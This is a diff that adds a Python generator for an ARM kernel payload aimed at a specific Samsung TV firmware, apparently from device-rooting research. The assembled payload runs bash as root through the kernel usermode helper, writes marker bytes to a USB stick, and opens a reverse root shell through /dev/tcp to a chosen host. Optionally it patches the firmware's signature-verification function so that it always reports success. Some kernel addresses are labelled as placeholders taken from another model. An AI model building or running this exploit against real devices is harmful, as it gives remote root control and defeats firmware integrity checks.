@@ -1,0 +1,426 @@
+#!/usr/bin/env python3
+# SPDX-License-Identifier: AGPL-3.0-only
+# Muse-L adaptation (T-MSLDEUC 1500.9); see docs/PROVENANCE.md.
+"""Muse-L test 6: kernel TCP report + UMH probes.
+
+Target: Samsung UE55RU7170UXZT, T-MSLDEUC 1500.9, kernel 4.1.10, base 0xc0008000
+Cave: 0xc0008318 - 0xc0008fc0 (3240 bytes)
+Injection offset: 1452 (0x5ac)
+
+Two profiles:
+
+  --no-patch (v1.3, preferred first run): no kernel text is written at all.
+    0. UMH /usr/bin/dd if=/proc/version of=/dev/sda bs=512 seek=5 count=1
+       -> marker C at offset 2560. /usr/bin/dd is a byte-verified ELF, so C
+          separates "UMH/root/DAC works" from "bash is blocked/missing";
+    1. UMH /bin/bash -c 'printf MUSEL-UMH-A|/usr/bin/dd of=/dev/sda ... seek=3'
+       -> marker A at 1536;
+    2. UMH /bin/bash -c 'printf MUSEL-UMH-B|/usr/bin/dd ... seek=4; exec
+       9<>/dev/tcp/HOST/4445; ... exec /bin/bash -i <&9 >&9 2>&9'
+       -> marker B at 2048 and a root shell on port+1.
+
+  default (v1.2, needs the UEP patch): bash A unpatched, msleep(1500), patch
+  SfdUepVerifyFileSignature (0xc01cdecc) to return 2
+  (SF_STATUS_UEP_SIGNATURE_CORRECT) + icache flush, then bash B + shell.
+
+The header (56 bytes) is sent last; for v1.3 word 6 carries the dd/UMH return.
+
+Nothing is written to the TV firmware; the only disk writes are the markers in
+the unused MBR gap (LBA 3, 4 and 5, before p1 at LBA 2048). Removing the stick
+and power-cycling recovers everything.
+
+exFAT constraint: every 16-bit halfword of the payload must be non-zero, so
+no `str/ldr [reg]` (imm12=0) and no `movt r0, #0xc000` (0xe34c0000). Values
+of 0xc000xxxx are staged through r6.
+"""
+import argparse
+import os
+import shutil
+import socket
+import struct
+import subprocess
+import tempfile
+
+from build_kernel_stage_kant import asm_string, extract_text, disasm
+
+# Muse-L (T-MSLDEUC 1500.9) addresses
+# Kernel base: 0xc0008000
+# Cave: 0xc0008318 - 0xc0008fc0 (3240 bytes)
+# Injection offset: 1452 (0x5ac)
+
+# KNOWN addresses (verified from 1500.9 kernel.bin)
+COHERENT = 0xC001CBA8          # v7_coherent_kern_range
+UEP = 0xC01CDECC               # SfdUepVerifyFileSignature
+MSLEEP = 0xC05FC3D5            # schedule_timeout_uninterruptible
+PARK = 0xC05FC3D5              # same as MSLEEP
+EMERGENCY_RESTART = 0xC05FAA9D # kernel_restart
+
+# UNKNOWN - need to find or use placeholders
+UMH = 0xC0039A78               # call_usermodehelper - PLACEHOLDER (Kant-M2 addr)
+SOCK_CREATE = 0xC03C0F8C       # PLACEHOLDER
+KERNEL_CONNECT = 0xC03C1500    # PLACEHOLDER
+KERNEL_SENDMSG = 0xC03C1134    # PLACEHOLDER
+FILP_OPEN = 0xC00F2D58         # PLACEHOLDER
+KERNEL_READ = 0xC00F91E4       # PLACEHOLDER
+
+# Muse-L cave layout (cave starts at 0xc0008318, 64 bytes before Kant-M2's 0xc0008358)
+SCRATCH = 0xC0008C00           # beyond the payload, inside the fixed cave span
+HDR = SCRATCH + 0x04           # 14 words = 56 bytes, ends at SCRATCH+0x3B
+# call_usermodehelper(wait=0) does NOT copy argv: each helper needs its own
+# array that stays intact until its worker has execed. Entries start at +4
+# so every store uses a non-zero imm12.
+ARGV0 = SCRATCH + 0x40         # dd probe
+ARGV1 = SCRATCH + 0x60         # bash A
+ARGV2 = SCRATCH + 0x80         # bash B
+
+# Muse-L cave addresses (shifted -0x40 from Kant-M2)
+CAVE = 0xC00083C0              # copy-window exit frame (was 0xc0008400)
+DEST = 0xC0008398              # memcpy destination (CAVE-40)
+STORE_FRAME = 0xC00083E8       # save-r1 epilogue frame
+STAGE0 = 0xC0008404            # 28-byte coherent-flush stub
+FLUSH_FRAME = 0xC000841C       # flush-wrapper epilogue frame
+FULL = 0xC0008430              # stage
+SAVE_IP = 0xC0008CC0           # save-r1 stores advanced source pointer
+FAKE_SP = 0xC0008DC0           # scratch stack
+
+SEND_BUF = """
+send_buf:
+    push    {r4, r5, r6, r7, r8, lr}
+    sub     sp, sp, #0x30
+    mov     r6, sp
+    mov     r7, r1               @ size
+    mov     r8, r0               @ buffer
+    mov     r5, #1
+    sub     r5, r5, #1           @ r5 = 0
+    str     r5, [r6, #0x04]      @ msg_name
+    str     r5, [r6, #0x08]      @ msg_namelen
+    add     r2, r6, #0x24
+    str     r2, [r6, #0x0c]      @ msg_iov
+    mov     r2, #1
+    str     r2, [r6, #0x10]      @ msg_iovlen
+    str     r5, [r6, #0x14]      @ msg_control
+    str     r5, [r6, #0x18]      @ msg_controllen
+    str     r5, [r6, #0x1c]      @ msg_flags
+    str     r8, [r6, #0x24]      @ kvec.base
+    str     r7, [r6, #0x28]      @ kvec.len
+    mov     r0, r9               @ sock
+    add     r1, r6, #0x04        @ msghdr
+    add     r2, r6, #0x24        @ kvec
+    mov     r3, #1               @ num
+    push    {r7, r12}            @ 5th arg = size, keeps sp 8-byte aligned
+    ldr     r4, kernel_sendmsg_addr
+    blx     r4
+    add     sp, sp, #8
+    add     sp, sp, #0x30
+    pop     {r4, r5, r6, r7, r8, pc}
+"""
+
+
+def emit(host, port, patch=True, boot=False):
+    ver = 0x00010002 if patch else 0x00010003
+    magic = 0x4C53554D           # "MUSL" (little-endian)
+    trailer = 0x4C53454D         # "MESL" (little-endian, partial "MUSEL")
+    ip = [int(x) for x in host.split(".")]
+    if len(ip) != 4 or any(not (0 <= x <= 255) for x in ip):
+        raise SystemExit("--beacon must be a dotted IPv4 address")
+    # sockaddr_in packs family (LE u16) then port (network order): word =
+    # 0x0002 | (htons(port) << 16). For 4444 -> 0x5c110002 -> 02 00 11 5c.
+    w0 = 0x0002 | (socket.htons(port) << 16)
+    w1 = ip[0] | (ip[1] << 8) | (ip[2] << 16) | (ip[3] << 24)
+
+    cmd_a = (
+        "printf MUSL-UMH-A|/usr/bin/dd of=/dev/sda bs=512 seek=3 "
+        "count=1 conv=notrunc 2>/dev/null"
+    )
+    cmd_b = (
+        "printf MUSL-UMH-B|/usr/bin/dd of=/dev/sda bs=512 seek=4 "
+        "count=1 conv=notrunc 2>/dev/null;"
+        f"exec 9<>/dev/tcp/{host}/{port + 1};"
+        "printf 'MUSL-SHELL uid=%s\\n' \"$UID\" >&9;"
+        "exec /bin/bash -i <&9 >&9 2>&9"
+    )
+    if boot:
+        # Boot variant: write the marker immediately, then wait (bounded) for
+        # the network before opening the shell. A bare TCP probe in a subshell
+        # avoids making the parent shell exit when the connect fails.
+        cmd_b = (
+            "printf MUSL-UMH-B|/usr/bin/dd of=/dev/sda bs=512 seek=4 "
+            "count=1 conv=notrunc 2>/dev/null;"
+            "i=0;while [ $i -lt 150 ];do "
+            f"(exec 3<>/dev/tcp/{host}/{port}) 2>/dev/null&&break;"
+            "sleep 2;i=$((i+1));done;"
+            f"exec 9<>/dev/tcp/{host}/{port + 1};"
+            "printf 'MUSL-SHELL uid=%s\\n' \"$UID\" >&9;"
+            "exec /bin/bash -i <&9 >&9 2>&9"
+        )
+    probe_path = "/usr/bin/dd"
+    probe_args = ["if=/proc/version", "of=/dev/sda", "bs=512",
+                  "seek=5", "count=1", "conv=notrunc"]
+
+    def ldaddr(reg, label):
+        """Load the absolute address of an in-payload label into reg.
+
+        reg must not be r0: `movt r0, #0xc000` encodes as 0xe34c0000, which
+        contains the forbidden 0x0000 halfword.
+        Uses PC-relative `adr` instruction (works within 1MB range).
+        """
+        if reg == "r0":
+            raise ValueError("use r6 + mov r0, r6 for 0xc000xxxx constants")
+        return f"    adr     {reg}, {label}\n"
+
+    def const(reg, value):
+        return (f"    movw    {reg}, #{value & 0xFFFF:#06x}\n"
+                f"    movt    {reg}, #{value >> 16:#06x}\n")
+
+    def ptr0(value, reg="r6"):
+        """value (0xc000xxxx) -> r0 via reg, avoiding movt r0,#0xc000."""
+        return const(reg, value) + f"    mov     r0, {reg}\n"
+
+    def call(label):
+        """Call an in-payload label by absolute address.
+
+        A plain `bl label` is left as an unresolved R_ARM_CALL relocation by
+        `clang -c`, and extracting .text without linking yields a branch to
+        self. Use PC-relative addressing via register.
+        """
+        return (
+            f"    adr     r12, {label}\n"
+            "    blx     r12\n"
+        )
+
+    def umh_call(label):
+        return (
+            ldaddr("r6", label)
+            + "    mov     r0, r6\n"
+            + "    add     r1, r8, #4\n"
+            + "    mov     r2, r11\n"
+            + "    mov     r3, r11\n"
+            + "    ldr     r4, umh_addr\n"
+            + "    blx     r4\n"
+        )
+
+    probe_asm = ""
+    if not patch:
+        exprs = [("probe_path", 0x04)]
+        exprs += [(f"probe_arg{i}", 0x08 + 4 * i)
+                  for i in range(len(probe_args))]
+        probe_asm = (
+            "    @ ---- UMH #0: dd (verified ELF): /proc/version -> LBA 5 ----\n"
+            + const("r8", ARGV0)
+            + "".join(
+                ldaddr("r6", lab)
+                + f"    str     r6, [r8, #{off:#04x}]\n"
+                for lab, off in exprs)
+            + f"    str     r11, [r8, #{0x08 + 4 * len(probe_args):#04x}]\n"
+            + umh_call("probe_path")
+            + "    str     r0, [r10, #0x1c]      @ header word 6: dd/UMH probe\n\n"
+            + "    movw    r0, #1000\n"
+            + "    ldr     r4, msleep_addr\n"
+            + "    blx     r4\n\n"
+        )
+
+    patch_asm = ""
+    if patch:
+        patch_asm = """    @ ---- patch SfdUepVerifyFileSignature -> return 2, flush icache ----
+    ldr     r0, uep_addr
+    ldr     r1, uep_word0
+    str     r1, [r0]
+    ldr     r1, uep_word1
+    str     r1, [r0, #4]
+    add     r1, r0, #8
+    ldr     r3, coherent_addr
+    blx     r3
+
+"""
+
+    zero_words = ([0x20, 0x24, 0x28, 0x2C, 0x30, 0x34] if not patch else
+                  [0x1C, 0x20, 0x24, 0x28, 0x2C, 0x30, 0x34])
+    header_zero_asm = "".join(
+        f"    str     r11, [r10, #{off:#04x}]\n" for off in zero_words)
+    probe_arg_asm = "".join(
+        f'probe_arg{i}: .asciz "{asm_string(a)}"\n    .balign 4, 0x41\n'
+        for i, a in enumerate(probe_args))
+
+    net_asm = ""
+    if not boot:
+        net_asm = f"""    @ sock_create(AF_INET=2, SOCK_STREAM=1, 0, &sock at sp+0x14)
+    mov     r0, #2
+    mov     r1, #1
+    mov     r2, r11
+    add     r3, sp, #0x14
+    ldr     r4, sock_create_addr
+    blx     r4
+    str     r0, [r10, #0x0c]      @ header word 2
+    ldr     r9, [sp, #0x14]       @ sock
+
+    @ connect only if sock_create() == 0
+    ldr     r0, [r10, #0x0c]
+    add     r0, r0, #1
+    cmp     r0, #1
+    blt     fail
+    mov     r0, r9
+    add     r1, sp, #0x04
+    mov     r2, #16
+    mov     r3, r11
+    ldr     r4, kernel_connect_addr
+    blx     r4
+    str     r0, [r10, #0x10]      @ header word 3
+    add     r0, r0, #1
+    cmp     r0, #1
+    blt     fail
+
+"""
+
+    header_asm = ""
+    if not boot:
+        header_asm = f"""    @ ---- header (sent last, so it carries both UMH returns) ----
+{const('r0', magic)}
+    str     r0, [r10, #0x04]
+{const('r0', ver)}
+    str     r0, [r10, #0x08]
+{const('r0', trailer)}
+    str     r0, [r10, #0x38]
+{header_zero_asm}{ptr0(HDR)}    mov     r1, #56
+{call('send_buf')}
+"""
+
+    body = f""".syntax unified
+.arm
+.global _start
+.section .text
+_start:
+    ldr     r4, saved_ip_addr
+    ldr     sp, [r4]
+    sub     sp, sp, #0x400
+    bic     sp, sp, #7
+    sub     sp, sp, #0x80
+
+    mov     r11, #1
+    sub     r11, r11, #1          @ r11 = 0
+{const('r10', SCRATCH)}
+    @ sockaddr_in at sp+4
+{const('r0', w0)}
+    str     r0, [sp, #0x04]
+{const('r0', w1)}
+    str     r0, [sp, #0x08]
+    str     r11, [sp, #0x0c]
+    str     r11, [sp, #0x10]
+
+{net_asm}{probe_asm}    @ ---- UMH #1: bash + dd marker A at offset 1536 (unpatched) ----
+{const('r8', ARGV1)}
+{ldaddr('r6', 'path')}    str     r6, [r8, #0x04]
+{ldaddr('r6', 'arg_c')}    str     r6, [r8, #0x08]
+{ldaddr('r6', 'cmd_a')}    str     r6, [r8, #0x0c]
+    str     r11, [r8, #0x10]
+{umh_call('path')}    str     r0, [r10, #0x14]      @ header word 4
+
+    @ give the unpatched helper time to run
+    movw    r0, #1500
+    ldr     r4, msleep_addr
+    blx     r4
+
+{patch_asm}    @ ---- UMH #2: marker B + reverse root shell on port+1 ----
+{const('r8', ARGV2)}
+{ldaddr('r6', 'path')}    str     r6, [r8, #0x04]
+{ldaddr('r6', 'arg_c')}    str     r6, [r8, #0x08]
+{ldaddr('r6', 'cmd_b')}    str     r6, [r8, #0x0c]
+    str     r11, [r8, #0x10]
+{umh_call('path')}    str     r0, [r10, #0x18]      @ header word 5
+
+{header_asm}park:
+    movw    r0, #0xffff
+    movt    r0, #0x7fff
+    ldr     r4, park_addr
+    blx     r4
+    b       park
+
+fail:
+    ldr     r4, emergency_restart_addr
+    blx     r4
+    b       fail
+
+path:    .asciz "/bin/bash"
+    .balign 4, 0x41
+arg_c:   .asciz "-c"
+    .balign 4, 0x41
+cmd_a:   .asciz "{asm_string(cmd_a)}"
+    .balign 4, 0x41
+cmd_b:   .asciz "{asm_string(cmd_b)}"
+    .balign 4, 0x41
+probe_path: .asciz "{asm_string(probe_path)}"
+    .balign 4, 0x41
+{probe_arg_asm}
+{SEND_BUF}
+    .balign 4, 0x41
+saved_ip_addr:          .word {SAVE_IP:#010x}
+sock_create_addr:       .word {SOCK_CREATE:#010x}
+kernel_connect_addr:    .word {KERNEL_CONNECT:#010x}
+kernel_sendmsg_addr:    .word {KERNEL_SENDMSG:#010x}
+umh_addr:               .word {UMH:#010x}
+msleep_addr:            .word {MSLEEP:#010x}
+coherent_addr:          .word {COHERENT:#010x}
+uep_addr:               .word {UEP:#010x}
+uep_word0:              .word 0xe3a00002
+uep_word1:              .word 0xe12fff1e
+park_addr:              .word {PARK:#010x}
+emergency_restart_addr: .word {EMERGENCY_RESTART:#010x}
+"""
+    return body
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--beacon", required=True,
+                    help="kernel report port; the bash shell uses port+1")
+    ap.add_argument("--out", required=True)
+    ap.add_argument("--keep-asm")
+    ap.add_argument("--disasm", action="store_true")
+    ap.add_argument("--no-patch", action="store_true",
+                    help="v1.3: no kernel text write; add the dd/UMH probe")
+    ap.add_argument("--boot", action="store_true",
+                    help="v1.4: no kernel network; UMH first, worker waits "
+                         "for the network before opening the shell")
+    a = ap.parse_args()
+
+    host, port_s = a.beacon.rsplit(":", 1)
+    if not port_s.isdigit():
+        raise SystemExit("--beacon must be IP:PORT")
+    src_text = emit(host, int(port_s), patch=not a.no_patch, boot=a.boot)
+
+    clang = shutil.which("clang")
+    if not clang:
+        raise SystemExit("clang not found")
+    if a.keep_asm:
+        open(a.keep_asm, "w").write(src_text)
+        print(f"wrote {a.keep_asm}")
+    with tempfile.TemporaryDirectory(prefix="musel-umh-") as td:
+        src = os.path.join(td, "stage.S")
+        obj = os.path.join(td, "stage.o")
+        open(src, "w").write(src_text)
+        subprocess.run(
+            [clang, "-target", "armv7-none-eabi", "-march=armv7-a",
+             "-c", src, "-o", obj],
+            check=True)
+        blob = extract_text(obj)
+    if len(blob) % 4:
+        raise SystemExit(f".text length {len(blob)} is not 4-byte aligned")
+    zeros = [i for i in range(0, len(blob), 2)
+             if struct.unpack_from("<H", blob, i)[0] == 0]
+    if zeros:
+        raise SystemExit(
+            f"generated payload contains zero halfwords at "
+            f"{[hex(x) for x in zeros]}")
+    if FULL + len(blob) > SCRATCH:
+        raise SystemExit(
+            f"payload {len(blob)} bytes ends at "
+            f"{FULL + len(blob):#x}, past scratch {SCRATCH:#x}")
+    open(a.out, "wb").write(blob)
+    print(f"wrote {a.out}: {len(blob)} bytes, zero_halfwords=[]")
+    print(f"payload {FULL:#x}..{FULL + len(blob) - 1:#x}, "
+          f"scratch {SCRATCH:#x}..{SCRATCH + 0x3ff:#x}")
+    if a.disasm:
+        disasm(blob)
+
+
+if __name__ == "__main__":
+    main()
